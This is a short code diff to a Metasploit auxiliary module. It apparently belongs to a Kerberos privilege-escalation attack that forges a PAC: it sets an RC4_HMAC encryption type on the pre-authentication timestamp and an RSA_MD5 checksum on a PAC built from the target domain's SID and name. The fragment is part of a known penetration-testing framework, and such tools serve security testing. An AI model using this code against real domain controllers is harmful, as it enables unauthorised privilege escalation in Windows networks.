@@ -58,7 +58,7 @@ class Metasploit4 < Msf::Auxiliary
     password_digest = OpenSSL::Digest.digest('MD4', unicode_password)
 
     pre_auth = []
-    pre_auth << build_as_pa_time_stamp(key: password_digest)
+    pre_auth << build_as_pa_time_stamp(key: password_digest, etype: Rex::Proto::Kerberos::Crypto::RC4_HMAC)
     pre_auth << build_pa_pac_request
     pre_auth
 
@@ -99,6 +99,7 @@ class Metasploit4 < Msf::Auxiliary
       domain_id: datastore['DOMAIN_SID'],
       realm: datastore['DOMAIN'],
       logon_time: logon_time,
+      checksum_type: Rex::Proto::Kerberos::Crypto::RSA_MD5
     )
 
     auth_data = build_pac_authorization_data(pac: pac)
